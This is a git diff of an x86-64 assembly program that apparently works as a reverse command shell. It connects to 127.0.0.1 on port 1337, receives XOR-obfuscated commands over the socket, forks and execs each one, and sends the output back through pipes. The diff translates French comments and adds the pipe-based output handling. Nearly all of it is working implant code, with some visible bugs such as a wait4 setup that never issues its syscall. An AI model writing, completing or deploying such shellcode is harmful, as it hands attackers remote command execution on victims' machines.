@@ -2,12 +2,11 @@ BITS 64
 
 SECTION .bss
 	sock_buffer resb 255
-    p0:
-    .read   resd    1
-    .write  resd    1
-    p1:
-    .read   resd    1
-    .write  resd    1
+
+    fds:
+        fd0 resb 1              ; pipe_read
+        fd1 resb 1              ; pipe_write
+
 SECTION .text
 global _start
 _start:
@@ -17,7 +16,7 @@ _socket:
         xor rbx,rbx
         xor rax,rax
         xor rcx,rcx
-        xor rdx,rdx                     ; purge des registres
+        xor rdx,rdx                     ; purge registers
 
         push byte 2                     ; Family - AF_INET (2) pour IPv4
         pop rdi
@@ -26,46 +25,40 @@ _socket:
         xor rdx, rdx
         mov al, 41                      ; syscall socket
         syscall
-        mov r15, rax			; saving socket
+        mov r15, rax			        ; saving socket
 
 ; ----- () sys_connect -----
 _connect:
 	xor rdi, rdi                    
-        xor rsi, rsi
-        xor rdi, rdi
+    xor rsi, rsi
+    xor rdi, rdi
 
-        mov rdi, r15                    ; on récupère le old_fd
+    mov rdi, r15                    ; getting fd
 
-        mov rcx, 0x12111190             ; set IP to 127.0.0.1(0x12111190) + 0x11111111
-        sub rcx, 0x11111111             ; -> - 0x11111111 pour arriver à 127.0.0.1
+    mov rcx, 0x12111190             ; set IP to 127.0.0.1(0x12111190) + 0x11111111
+    sub rcx, 0x11111111             ; -> - 0x11111111 pour arriver à 127.0.0.1
 
-        push rcx
-        push word 0x3905                ; port 1337
-        push word 2
-        mov rsi, rsp                    ; struct sockaddr
-        push byte 36                           
-        pop rdx                         ; addrlen - 36
-        xor rax, rax
-        mov al, 42
-        syscall
+    push rcx
+    push word 0x3905                ; port 1337
+    push word 2
+    mov rsi, rsp                    ; struct sockaddr
 
-; ---- (22) sys_pipe (int *filedes) ----
-_child_pipe:
-                            ; we already got rsi with the fd
-    mov al, 22
+    push byte 36
+    pop rdx                         ; addrlen = 36
+
+    mov al, 42
     syscall
-    js _exit
-
-; ---- (22) sys_pipe (int *filedes) ----
-_parent_pipe:
-                            ; we already got rsi with the fd
-    mov al, 22
-    syscall
-    js _exit
 
 
-; ----- (0) sys_read (unsigned int fd, char *buf, size_t count) -----
+
 _read:
+; ---- (22) sys_pipe (int *filedes) ----
+; we need to create a new pipe on each read
+    mov rdx, fds
+    mov al, 22
+    syscall
+
+; ---- (0) sys_read (unsigned int fd, char *buf, size_t count) -----
     xor r12, r12
 	xor rax, rax
 	xor rdi, rdi
@@ -76,7 +69,7 @@ _read:
 	
 	push sock_buffer
 	mov rsi, rsp			; rsi <- char *buf : 
-					        ; destination (on alloue une la taille de 2048 à la mémoire)
+					        ; destination (on alloue une la taille de 255 à la mémoire)
 		
 	mov rdx, 255			; rdx <- size_t count : on lui donne la taille du buffer
 	syscall
@@ -86,7 +79,7 @@ _read:
 	cmp rax, 0
     jz _exit               ; jump in exit if receved is nothing
 
-_decrypt_xor:              ; xor function
+_decrypt_xor:              ; xor decrypt function
     ; rsi = buffer
     ; rbx = size buffer
     ; rdx (dl) = xor key
@@ -97,11 +90,10 @@ _decrypt_xor:              ; xor function
         dec rbx
         jne next_byte
 
-	mov r12, rsi          ; mov fd dans r12 pour l'utiliser plutard
+	mov r12, rsi          ; mov fd in r12
 
 ; ---- (57) sys_fork ----
 _fork:
-
 	mov al, 57			; sys_fork
 	syscall
 
@@ -109,14 +101,75 @@ _fork:
 	je _execve			; jmp child process to execve
 
     cmp rax, -1
-    je _send_error      ; si le fork fail -> goto send_error
+    je _send_error      ; if fork failed -> goto send_error
+
+    ; si on est dans le parent:
+        ; wait4 to wait for the child to end
+        ; close pipe_write
+        ; get content of pipe with sys_read
+        ; sys_write of the content that we got
+        ; close pipe_read
+        ; jmp to _read
+
+    ; ---- (61) sys_wait4 (pid_t upid, int *stat_addr, int options, struct rusage *ru) ----
+    ; wait for the child to die
+    xor r10, r10
+    xor rdx, rdx
+    mov rsi, 0
+    mov rdi, rax
+    mov al, 61
+
+    ; ---- (3) sys_close (unsigned int fd) ----
+    ; close the pipe_write
+    mov al, 3
+    mov rdi, fd1
+    syscall
+
+; ----- (0) sys_read (unsigned int fd, char *buf, size_t count) -----
+    xor rdi, rdi
+    xor rsi, rsi
+
+    mov rdi, fd0			; rdi <- unsigned int fd
+
+    push sock_buffer
+    mov rsi, rsp			; rsi <- char *buf :
+    					        ; destination (on alloue une la taille de 255 à la mémoire)
+
+    mov rdx, 255			; rdx <- size_t count : on lui donne la taille du buffer
+    syscall
+
+
+    ; ---- (2) sys_write (unsigned int fd, const char *buf, size_t count) ----
+
+    ; rsi is already set
+
+    mov rdx, rax                 ; rdx = size_t count = rax from sys_read
+
+    mov rdi, r15
+
+    mov rax, 1
+
+    syscall
+
+    ; ---- (3) sys_close (unsigned int fd) ----
+    ; close the pipe_read
+    mov al, 3
+    mov rdi, fd0
+    syscall
 
 	jmp _read			; jmp in parent sys_connect if in parent process
 
+_execve:
+
+; need to close pipe_read first !!
+
+ ; ---- (3) sys_close (unsigned int fd) ----
+    ; close the pipe_read
+    mov al, 3
+    mov rdi, fd0
+    syscall
 
 ; ----- (59) execve (const char *filename, const char *const argv[], const char *const envp[]) -----
-_execve:
-	xor rax, rax
     xor rbx, rbx
     xor rcx, rcx
 	xor rsi, rsi	
